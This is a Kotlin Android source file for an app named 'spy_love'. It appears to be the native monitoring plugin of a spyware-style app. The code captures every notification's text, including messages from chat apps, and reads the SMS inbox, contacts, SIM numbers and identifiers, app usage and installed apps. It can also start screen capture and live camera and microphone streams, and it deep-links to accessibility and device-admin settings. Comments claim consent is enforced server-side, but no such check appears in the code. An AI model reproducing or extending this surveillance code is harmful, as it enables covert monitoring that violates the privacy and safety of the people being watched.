package org.hmg.spy_love

import android.Manifest
import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioTrack
import android.app.AppOpsManager
import android.app.usage.UsageStatsManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.Process
import android.provider.ContactsContract
import android.provider.Settings
import android.provider.Telephony
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import androidx.core.content.ContextCompat
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.BinaryMessenger
import io.flutter.plugin.common.EventChannel
import io.flutter.plugin.common.MethodChannel

object NotificationEventSink {
    var sink: EventChannel.EventSink? = null
}

object SimEventSink {
    var sink: EventChannel.EventSink? = null
}

class SpyLoveNotificationListenerService : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        emit(sbn, removed = false)
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        emit(sbn, removed = true)
    }

    /**
     * Emits a notification event to Dart. Carries enough context for Dart to
     * route it (covert/non-chat -> notification.*, messaging apps -> message.*)
     * without changing which notifications are observed (consent is enforced
     * server-side by event_type prefix).
     */
    private fun emit(sbn: StatusBarNotification, removed: Boolean) {
        val n = sbn.notification
        val extras = n.extras
        val title = extras.getCharSequence("android.title")?.toString() ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val subText = extras.getCharSequence("android.subText")?.toString() ?: ""
        val bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
        val category = n.category ?: ""
        val channelId = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            n.channelId ?: ""
        } else {
            ""
        }
        val payload = hashMapOf(
            "package" to sbn.packageName,
            "title" to title,
            "text" to text,
            "sub_text" to subText,
            "big_text" to bigText,
            "category" to category,
            "channel_id" to channelId,
            "notification_key" to sbn.key,
            "is_group" to n.flags.and(android.app.Notification.FLAG_GROUP_SUMMARY).let { it != 0 },
            "removed" to removed,
            "when" to sbn.postTime,
            "idempotency_key" to "notif-${if (removed) "rm" else "post"}-${sbn.postTime}-${sbn.packageName}-${title.hashCode()}-${text.hashCode()}",
        )
        NotificationEventSink.sink?.success(payload)
    }
}

class MonitoringPlugin(private val context: Context) : MethodChannel.MethodCallHandler {

    private var simReceiver: BroadcastReceiver? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onMethodCall(call: io.flutter.plugin.common.MethodCall, result: MethodChannel.Result) {
        when (call.method) {
            "isNotificationAccessEnabled" -> {
                result.success(isNotificationAccessEnabled())
            }
            "openNotificationAccessSettings" -> {
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                result.success(null)
            }
            "getSmsInbox" -> {
                val sinceMs = call.argument<Number>("sinceMs")?.toLong() ?: 0L
                val limit = call.argument<Int>("limit") ?: 100
                result.success(readSmsInbox(sinceMs, limit))
            }
            "getSimCards" -> {
                result.success(readSimCards())
            }
            "getBatteryStatus" -> {
                result.success(readBatteryStatus())
            }
            "getNetworkStatus" -> {
                result.success(readNetworkStatus())
            }
            "getDeviceInfo" -> {
                result.success(readDeviceInfo())
            }
            "getAppUsage" -> {
                val sinceMs = call.argument<Number>("sinceMs")?.toLong()
                    ?: (System.currentTimeMillis() - 24L * 60L * 60L * 1000L)
                val limit = call.argument<Int>("limit") ?: 20
                result.success(readAppUsage(sinceMs, limit))
            }
            "isUsageAccessEnabled" -> {
                result.success(isUsageAccessEnabled())
            }
            "openUsageAccessSettings" -> {
                // PACKAGE_USAGE_STATS is a special/settings permission — same UX
                // pattern as notification listener: open the system settings screen.
                val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                result.success(null)
            }
            "isScreenCaptureSupported" -> {
                result.success(ScreenCaptureController.isSupported())
            }
            "startScreenCapture" -> {
                val fps = call.argument<Int>("fps") ?: 8
                val maxWidth = call.argument<Int>("maxWidth") ?: 720
                val jpegQuality = call.argument<Int>("jpegQuality") ?: 40
                ScreenCaptureController.requestCapture(result, fps, maxWidth, jpegQuality)
            }
            "stopScreenCapture" -> {
                ScreenCaptureController.stopCapture(context)
                result.success(null)
            }
            "startLiveCamera" -> {
                val facing = call.argument<String>("facing") ?: "back"
                LiveAvController.startCamera(context, facing, result)
            }
            "switchLiveCamera" -> {
                val facing = call.argument<String>("facing") ?: "back"
                LiveAvController.switchCamera(facing, result)
            }
            "stopLiveCamera" -> {
                LiveAvController.stopCamera(context)
                result.success(null)
            }
            "startLiveMic" -> {
                LiveAvController.startMic(context, result)
            }
            "stopLiveMic" -> {
                LiveAvController.stopMic(context)
                result.success(null)
            }
            "playPcmChunk" -> {
                val pcm = call.argument<ByteArray>("pcm")
                val sampleRate = call.argument<Int>("sampleRate") ?: 16000
                val channels = call.argument<Int>("channels") ?: 1
                if (pcm == null) {
                    result.success(null)
                    return
                }
                PcmPlayback.play(pcm, sampleRate, channels)
                result.success(null)
            }
            "stopPcmPlayback" -> {
                PcmPlayback.stop()
                result.success(null)
            }
            "openSettingsPage" -> {
                val page = call.argument<String>("page") ?: "appDetails"
                result.success(openSettingsPage(page))
            }
            "getSettingsPermissionState" -> {
                val page = call.argument<String>("page") ?: ""
                result.success(getSettingsPermissionState(page))
            }
            "getInstalledApps" -> {
                val includeSystem = call.argument<Boolean>("includeSystem") ?: true
                result.success(readInstalledApps(includeSystem))
            }
            "getContacts" -> {
                val limit = call.argument<Int>("limit") ?: 2000
                result.success(readContacts(limit))
            }
            else -> result.notImplemented()
        }
    }

    private fun hasPhonePermission(): Boolean {
        val phoneState = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_PHONE_STATE,
        ) == PackageManager.PERMISSION_GRANTED
        val phoneNumbers = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_PHONE_NUMBERS,
            ) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
        return phoneState && phoneNumbers
    }

    private fun readBatteryStatus(): Map<String, Any?> {
        val intent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        if (intent == null) {
            return mapOf(
                "level" to -1,
                "scale" to 100,
                "percent" to -1,
                "charging" to false,
                "status" to "unknown",
                "plugged" to "none",
            )
        }

        val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, 100).coerceAtLeast(1)
        val percent = if (level >= 0) ((level * 100) / scale) else -1
        val statusCode = intent.getIntExtra(BatteryManager.EXTRA_STATUS, BatteryManager.BATTERY_STATUS_UNKNOWN)
        val pluggedCode = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0)

        val status = when (statusCode) {
            BatteryManager.BATTERY_STATUS_CHARGING -> "charging"
            BatteryManager.BATTERY_STATUS_DISCHARGING -> "discharging"
            BatteryManager.BATTERY_STATUS_FULL -> "full"
            BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "not_charging"
            else -> "unknown"
        }
        val plugged = when (pluggedCode) {
            BatteryManager.BATTERY_PLUGGED_AC -> "ac"
            BatteryManager.BATTERY_PLUGGED_USB -> "usb"
            BatteryManager.BATTERY_PLUGGED_WIRELESS -> "wireless"
            else -> "none"
        }
        val charging = statusCode == BatteryManager.BATTERY_STATUS_CHARGING ||
            statusCode == BatteryManager.BATTERY_STATUS_FULL ||
            pluggedCode != 0

        return mapOf(
            "level" to level,
            "scale" to scale,
            "percent" to percent,
            "charging" to charging,
            "status" to status,
            "plugged" to plugged,
        )
    }

    private fun readNetworkStatus(): Map<String, Any?> {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork
        val caps = network?.let { cm.getNetworkCapabilities(it) }
        if (caps == null) {
            return mapOf(
                "type" to "none",
                "connected" to false,
            )
        }

        val type = when {
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "cellular"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ethernet"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_BLUETOOTH) -> "bluetooth"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN) -> "vpn"
            else -> "other"
        }
        val connected = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)

        return mapOf(
            "type" to type,
            "connected" to connected,
        )
    }

    /** Safe non-PII device metadata only (no ANDROID_ID / serial / accounts). */
    private fun readDeviceInfo(): Map<String, Any?> {
        return mapOf(
            "manufacturer" to Build.MANUFACTURER,
            "model" to Build.MODEL,
            "brand" to Build.BRAND,
            "device" to Build.DEVICE,
            "product" to Build.PRODUCT,
            "hardware" to Build.HARDWARE,
            "os" to "android",
            "os_version" to Build.VERSION.RELEASE,
            "sdk_int" to Build.VERSION.SDK_INT,
            "security_patch" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Build.VERSION.SECURITY_PATCH
            } else {
                ""
            },
        )
    }

    private fun isUsageAccessEnabled(): Boolean {
        val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                Process.myUid(),
                context.packageName,
            )
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                Process.myUid(),
                context.packageName,
            )
        }
        return mode == AppOpsManager.MODE_ALLOWED
    }

    /**
     * Requires PACKAGE_USAGE_STATS (Usage Access) granted in system settings.
     * Returns apps sorted by foreground time descending.
     */
    private fun readAppUsage(sinceMs: Long, limit: Int): List<Map<String, Any?>> {
        if (!isUsageAccessEnabled()) return emptyList()

        val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val end = System.currentTimeMillis()
        val start = sinceMs.coerceAtMost(end)
        val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, start, end) ?: return emptyList()

        return stats
            .filter { it.totalTimeInForeground > 0L }
            .sortedByDescending { it.totalTimeInForeground }
            .take(limit.coerceIn(1, 100))
            .map { usage ->
                mapOf(
                    "package" to usage.packageName,
                    "foreground_ms" to usage.totalTimeInForeground,
                    "last_used_ms" to usage.lastTimeUsed,
                )
            }
    }

    private fun readSimCards(): List<Map<String, Any?>> {
        if (!hasPhonePermission()) return emptyList()

        val telephony = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val cards = mutableListOf<Map<String, Any?>>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            val subscriptionManager =
                context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val subscriptions = subscriptionManager.activeSubscriptionInfoList ?: emptyList()

            for (sub in subscriptions) {
                val slot = sub.simSlotIndex
                var number = sub.number?.trim().orEmpty()
                val tm = telephony.createForSubscriptionId(sub.subscriptionId)
                if (number.isEmpty()) {
                    number = tm.line1Number?.trim().orEmpty()
                }

                cards.add(
                    mapOf(
                        "slot" to slot,
                        "subscription_id" to sub.subscriptionId,
                        "phone_number" to number,
                        "carrier" to sub.carrierName?.toString().orEmpty(),
                        "icc_id" to sub.iccId.orEmpty(),
                        "display_name" to sub.displayName?.toString().orEmpty(),
                    ),
                )
            }
        }

        if (cards.isEmpty()) {
            val number = telephony.line1Number?.trim().orEmpty()
            cards.add(
                mapOf(
                    "slot" to 0,
                    "subscription_id" to -1,
                    "phone_number" to number,
                    "carrier" to telephony.simOperatorName.orEmpty(),
                    "icc_id" to telephony.simSerialNumber.orEmpty(),
                    "display_name" to "",
                ),
            )
        }

        return cards
    }

    private fun emitSimChange() {
        val payload = mapOf(
            "type" to "state_changed",
            "sims" to readSimCards(),
            "when" to System.currentTimeMillis(),
        )
        SimEventSink.sink?.success(payload)
    }

    private fun registerSimReceiver() {
        if (simReceiver != null) return

        simReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context?, intent: Intent?) {
                val action = intent?.action ?: return
                if (
                    action == "android.intent.action.SIM_STATE_CHANGED" ||
                    action == Intent.ACTION_BOOT_COMPLETED
                ) {
                    mainHandler.postDelayed({ emitSimChange() }, 1500)
                }
            }
        }

        val filter = IntentFilter().apply {
            addAction("android.intent.action.SIM_STATE_CHANGED")
            addAction(Intent.ACTION_BOOT_COMPLETED)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            context.registerReceiver(simReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            context.registerReceiver(simReceiver, filter)
        }
    }

    private fun readSmsInbox(sinceMs: Long, limit: Int): List<Map<String, Any?>> {
        val messages = mutableListOf<Map<String, Any?>>()
        val projection = arrayOf(
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
        )
        val selection = "${Telephony.Sms.DATE} >= ?"
        val selectionArgs = arrayOf(sinceMs.toString())
        val sortOrder = "${Telephony.Sms.DATE} DESC LIMIT $limit"

        context.contentResolver.query(
            Telephony.Sms.Inbox.CONTENT_URI,
            projection,
            selection,
            selectionArgs,
            sortOrder,
        )?.use { cursor ->
            val addressIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY)
            val dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE)

            while (cursor.moveToNext()) {
                messages.add(
                    mapOf(
                        "address" to cursor.getString(addressIdx),
                        "body" to cursor.getString(bodyIdx),
                        "date" to cursor.getLong(dateIdx),
                    ),
                )
            }
        }

        return messages
    }

    private fun isNotificationAccessEnabled(): Boolean {
        val flat = Settings.Secure.getString(
            context.contentResolver,
            "enabled_notification_listeners",
        ) ?: return false
        val component = ComponentName(context, SpyLoveNotificationListenerService::class.java)
        return flat.contains(component.flattenToString())
    }

    /**
     * Deep-links to the exact system settings page for a settings-only
     * permission. Returns true when an intent was fired.
     */
    private fun openSettingsPage(page: String): Boolean {
        val intent: Intent = when (page) {
            "accessibility" -> Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            "usageAccess", "usage_access" ->
                Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
            "notificationListener", "notification_listener" ->
                Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            "overlay" -> Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                android.net.Uri.parse("package:" + context.packageName),
            )
            "batteryOptimization", "battery" ->
                Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
            "deviceAdmin", "device_admin" ->
                Intent(Settings.ACTION_SECURITY_SETTINGS)
            else -> Intent(
                Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                android.net.Uri.parse("package:" + context.packageName),
            )
        }
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        return try {
            context.startActivity(intent)
            true
        } catch (_: Throwable) {
            try {
                val fallback = Intent(
                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    android.net.Uri.parse("package:" + context.packageName),
                ).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(fallback)
                true
            } catch (_: Throwable) {
                false
            }
        }
    }

    /** Best-effort live state for settings-only permissions. */
    private fun getSettingsPermissionState(page: String): Boolean? {
        return when (page) {
            "usage_access", "usageAccess" -> isUsageAccessEnabled()
            "notification_listener", "notificationListener" ->
                isNotificationAccessEnabled()
            "overlay" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Settings.canDrawOverlays(context)
            } else {
                true
            }
            "accessibility" -> isAccessibilityEnabled()
            else -> null
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        val enabled = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
        ) ?: return false
        val component = ComponentName(context, SpyLoveAccessibilityService::class.java)
        val flat = component.flattenToString()
        return enabled.split(':').any { entry ->
            val e = entry.trim()
            e.equals(flat, ignoreCase = true) ||
                e.endsWith("/.SpyLoveAccessibilityService") ||
                e.endsWith("/SpyLoveAccessibilityService")
        }
    }

    /**
     * Reads the device address book (display name, phone numbers, emails) for
     * the `contact.snapshot` collector. Requires READ_CONTACTS. Photo blobs are
     * intentionally never read (backend strips them anyway). Consent for the
     * `contacts` scope is enforced server-side on ingest.
     */
    private fun readContacts(limit: Int): List<Map<String, Any?>> {
        val hasPermission = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_CONTACTS,
        ) == PackageManager.PERMISSION_GRANTED
        if (!hasPermission) return emptyList()

        val byId = LinkedHashMap<String, MutableMap<String, Any?>>()
        val resolver = context.contentResolver

        // Base contacts: id + display name.
        resolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            arrayOf(
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME,
            ),
            null,
            null,
            ContactsContract.Contacts.DISPLAY_NAME + " ASC",
        )?.use { cursor ->
            val idIdx = cursor.getColumnIndex(ContactsContract.Contacts._ID)
            val nameIdx = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
            while (cursor.moveToNext() && byId.size < limit) {
                val id = cursor.getString(idIdx) ?: continue
                val name = if (nameIdx >= 0) cursor.getString(nameIdx) ?: "" else ""
                byId[id] = hashMapOf(
                    "contact_id" to id,
                    "name" to name,
                    "phones" to mutableListOf<String>(),
                    "emails" to mutableListOf<String>(),
                )
            }
        }

        if (byId.isEmpty()) return emptyList()

        // Phone numbers.
        resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
            ),
            null,
            null,
            null,
        )?.use { cursor ->
            val idIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
            val numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (cursor.moveToNext()) {
                val id = cursor.getString(idIdx) ?: continue
                val number = cursor.getString(numIdx) ?: continue
                @Suppress("UNCHECKED_CAST")
                val phones = byId[id]?.get("phones") as? MutableList<String> ?: continue
                if (number.isNotBlank() && phones.size < 10 && !phones.contains(number)) {
                    phones.add(number)
                }
            }
        }

        // Email addresses.
        resolver.query(
            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Email.CONTACT_ID,
                ContactsContract.CommonDataKinds.Email.ADDRESS,
            ),
            null,
            null,
            null,
        )?.use { cursor ->
            val idIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.CONTACT_ID)
            val addrIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
            while (cursor.moveToNext()) {
                val id = cursor.getString(idIdx) ?: continue
                val addr = cursor.getString(addrIdx) ?: continue
                @Suppress("UNCHECKED_CAST")
                val emails = byId[id]?.get("emails") as? MutableList<String> ?: continue
                if (addr.isNotBlank() && emails.size < 10 && !emails.contains(addr)) {
                    emails.add(addr)
                }
            }
        }

        return byId.values.toList()
    }

    /**
     * Lists installed apps available to the monitor: label, package, system
     * flag, and a base64 PNG icon. Requires QUERY_ALL_PACKAGES to see apps the
     * caller has not been granted visibility to on Android 11+.
     */
    private fun readInstalledApps(includeSystem: Boolean): List<Map<String, Any?>> {
        val pm = context.packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        val apps = mutableListOf<Map<String, Any?>>()
        for (info in packages) {
            val isSystem =
                (info.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
            if (isSystem && !includeSystem) continue
            val label = try {
                pm.getApplicationLabel(info).toString()
            } catch (_: Throwable) {
                info.packageName
            }
            val version = try {
                pm.getPackageInfo(info.packageName, 0).versionName
            } catch (_: Throwable) {
                null
            }
            var iconB64: String? = null
            try {
                val drawable = pm.getApplicationIcon(info.packageName)
                val bmp = drawableToBitmap(drawable)
                if (bmp != null) {
                    val stream = java.io.ByteArrayOutputStream()
                    bmp.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, stream)
                    iconB64 = android.util.Base64.encodeToString(
                        stream.toByteArray(), android.util.Base64.NO_WRAP,
                    )
                    bmp.recycle()
                }
            } catch (_: Throwable) {
                iconB64 = null
            }
            apps.add(
                mapOf(
                    "package" to info.packageName,
                    "name" to label,
                    "system" to isSystem,
                    "version" to version,
                    "icon" to iconB64,
                ),
            )
        }
        apps.sortBy { (it["name"] as? String)?.lowercase() ?: "" }
        return apps
    }

    private fun drawableToBitmap(drawable: android.graphics.drawable.Drawable): android.graphics.Bitmap? {
        if (drawable is android.graphics.drawable.BitmapDrawable && drawable.bitmap != null) {
            // Downscale large launcher icons to keep payloads small.
            val src = drawable.bitmap
            val size = 96
            return android.graphics.Bitmap.createScaledBitmap(src, size, size, true)
        }
        val size = 96
        val width = if (drawable.intrinsicWidth > 0) drawable.intrinsicWidth else size
        val height = if (drawable.intrinsicHeight > 0) drawable.intrinsicHeight else size
        val bitmap = android.graphics.Bitmap.createBitmap(
            width, height, android.graphics.Bitmap.Config.ARGB_8888,
        )
        val canvas = android.graphics.Canvas(bitmap)
        drawable.setBounds(0, 0, canvas.width, canvas.height)
        drawable.draw(canvas)
        return if (width != size || height != size) {
            val scaled = android.graphics.Bitmap.createScaledBitmap(bitmap, size, size, true)
            bitmap.recycle()
            scaled
        } else {
            bitmap
        }
    }

    companion object {
        private const val METHOD_CHANNEL = "org.hmg.spy_love/monitoring"
        private const val NOTIFICATION_EVENT_CHANNEL = "org.hmg.spy_love/notification_events"
        private const val SIM_EVENT_CHANNEL = "org.hmg.spy_love/sim_events"
        private const val SCREEN_FRAME_EVENT_CHANNEL = "org.hmg.spy_love/screen_frames"
        private const val LIVE_AV_EVENT_CHANNEL = "org.hmg.spy_love/live_av"

        fun register(messenger: BinaryMessenger, context: Context) {
            val plugin = MonitoringPlugin(context)

            MethodChannel(messenger, METHOD_CHANNEL)
                .setMethodCallHandler(plugin)

            EventChannel(messenger, NOTIFICATION_EVENT_CHANNEL)
                .setStreamHandler(object : EventChannel.StreamHandler {
                    override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                        NotificationEventSink.sink = events
                    }

                    override fun onCancel(arguments: Any?) {
                        NotificationEventSink.sink = null
                    }
                })

            EventChannel(messenger, SIM_EVENT_CHANNEL)
                .setStreamHandler(object : EventChannel.StreamHandler {
                    override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                        SimEventSink.sink = events
                        plugin.registerSimReceiver()
                    }

                    override fun onCancel(arguments: Any?) {
                        SimEventSink.sink = null
                    }
                })

            EventChannel(messenger, SCREEN_FRAME_EVENT_CHANNEL)
                .setStreamHandler(object : EventChannel.StreamHandler {
                    override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                        ScreenFrameEventSink.sink = events
                    }

                    override fun onCancel(arguments: Any?) {
                        ScreenFrameEventSink.sink = null
                    }
                })

            EventChannel(messenger, LIVE_AV_EVENT_CHANNEL)
                .setStreamHandler(object : EventChannel.StreamHandler {
                    override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                        LiveAvEventSink.sink = events
                    }

                    override fun onCancel(arguments: Any?) {
                        LiveAvEventSink.sink = null
                    }
                })
        }
    }
}